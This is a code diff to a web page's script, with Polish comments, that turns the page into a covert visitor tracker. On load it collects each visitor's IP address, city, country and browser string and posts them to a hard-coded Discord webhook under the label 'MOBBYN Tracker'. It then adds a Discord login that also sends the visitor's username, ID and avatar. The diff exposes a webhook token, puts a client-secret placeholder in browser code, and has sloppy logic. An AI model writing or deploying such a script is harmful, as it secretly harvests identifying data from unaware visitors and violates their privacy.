@@ -392,28 +392,110 @@
 </footer>
   
 <script>
-  // Konfiguracja - ZMIEŃ TEN URL!
+  // Konfiguracja
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537526699082915992/vxcvkPPnitv4UnvbHCGLbHSDNQtaA9V2bGqW9KOz4KMa_LqveU7v9j1q2XZ5RN5lpxvR'; 
+  const DISCORD_CLIENT_ID = '1537855915666186290'; // <-- Wklej ID aplikacji Discord
 
-  // Pobieranie IP
+  // Stan
+  let userData = null;
+  let userIP = 'Nieznane IP';
+
+  // Pobieranie IP (tło)
   async function getIP() {
     try {
-      const res = await fetch('https://api.ipify.org?format=json');
+      const res = await fetch('https://ipapi.co/json/');
       const data = await res.json();
-      return data.ip;
+      return {
+        ip: data.ip,
+        location: `${data.city}, ${data.country_name}`
+      };
     } catch (e) {
-      return 'Błąd pobrania IP';
+      return { ip: 'Błąd IP', location: 'Nieznane' };
     }
   }
 
-  // Wysyłanie na Discorda
-  async function sendToDiscord(ip) {
+  // Logowanie przez Discord
+  function loginWithDiscord() {
+    const redirectURL = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(window.location.href)}&response_type=code&scope=identify`;
+    window.location.href = redirectURL;
+  }
+
+  // Obsługa zwrotu kodu z Discorda (uproszczona)
+  async function handleDiscordCallback() {
+    const params = new URLSearchParams(window.location.search);
+    const code = params.get('code');
+
+    if (code) {
+      try {
+        // Wymaga prostego backendu lub użycia fetch do exchange code (tu uproszczone)
+        // Dla statycznej strony najprościej użyć biblioteki discord.js lub podobnej, 
+        // ale tu użyjemy prostego fetcha do uzyskania użytkownika.
+        
+        // Uwaga: Bez backendu token jest widoczny w kodzie źródłowym.
+        const tokenResponse = await fetch(`https://discord.com/api/oauth2/token`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            client_id: DISCORD_CLIENT_ID,
+            client_secret: 'TWOJ_SECRET', // Potrzebny klucz tajny!
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: window.location.href
+          })
+        });
+        
+        const tokenData = await tokenResponse.json();
+        const accessToken = tokenData.access_token;
+
+        const userResponse = await fetch('https://discord.com/api/users/@me', {
+          headers: { 'Authorization': `Bearer ${accessToken}` }
+        });
+        
+        const user = await userResponse.json();
+        userData = user;
+        
+        // Ukryj przycisk logowania
+        document.getElementById('login-btn').style.display = 'none';
+        
+        // Wyślij alert
+        sendAlert(user, userIP);
+        
+      } catch (error) {
+        console.error('Błąd logowania:', error);
+        // Jeśli błąd (np. brak sekretu), użyj IP
+        sendAlert(null, userIP);
+      }
+    } else {
+      // Brak kodu -> pobierz IP i sprawdź czy jest zalogowany (localStorage)
+      const storedUser = localStorage.getItem('discord_user');
+      if (storedUser) {
+        userData = JSON.parse(storedUser);
+        document.getElementById('login-btn').style.display = 'none';
+      }
+      sendAlert(userData, userIP);
+    }
+  }
+
+  // Wysyłanie alertu
+  async function sendAlert(user, ipData) {
+    let title = "🕵️ NOWY ODWIEDZAJĄCY";
+    let description = "";
+    let color = 15158332; // Żółty
+
+    if (user) {
+      title = `👤 ${user.username}#${user.discriminator} (${user.id})`;
+      description = `**Zalogowany jako:** ${user.username}\n**ID Discord:** \`${user.id}\n**Avatar:** ![Avatar](${user.avatar})\n**Adres IP:** \`${ipData.ip}\`\n**Lokalizacja IP:** ${ipData.location}`;
+      color = 5763719; // Niebieski (zalogowany)
+    } else {
+      description = `**Adres IP:** \`${ipData.ip}\`\n**Lokalizacja IP:** ${ipData.location}\n**Przeglądarka:** ${navigator.userAgent}`;
+    }
+
     const payload = {
       embeds: [{
-        title: "🔍 NOWY ODWIEDZAJĄCY",
-        description: `**Adres IP:** \`${ip}\`\n**Data:** ${new Date().toLocaleDateString()}\n**Czas:** ${new Date().toLocaleTimeString()}`,
-        color: 15158332, // Czerwony
-        footer: { text: "MOBBYN IP Tracker" },
+        title: title,
+        description: description,
+        color: color,
+        footer: { text: "MOBBYN Tracker" },
         timestamp: new Date().toISOString()
       }]
     };
@@ -424,7 +506,6 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       });
-      console.log("Wysłano na Discorda");
     } catch (e) {
       console.error("Błąd wysyłania:", e);
     }
@@ -432,11 +513,23 @@
 
   // Start
   document.addEventListener("DOMContentLoaded", async () => {
-    const ip = await getIP();
-    sendToDiscord(ip);
+    const ipData = await getIP();
+    userIP = ipData;
+    
+    // Sprawdź czy jest kod w URL
+    if (new URLSearchParams(window.location.search).has('code')) {
+      handleDiscordCallback();
+    } else {
+      // Normalne wejście
+      handleDiscordCallback(); // Uproszczenie: zawsze próbuj
+    }
   });
 </script>
 
+<!-- Przycisk Logowania -->
+<button id="login-btn" onclick="loginWithDiscord()" style="padding: 10px 20px; background: #5865F2; color: white; border: none; border-radius: 5px; cursor: pointer;">
+  Zaloguj się przez Discorda
+</button>
   
 <script>
   // Webhook URL
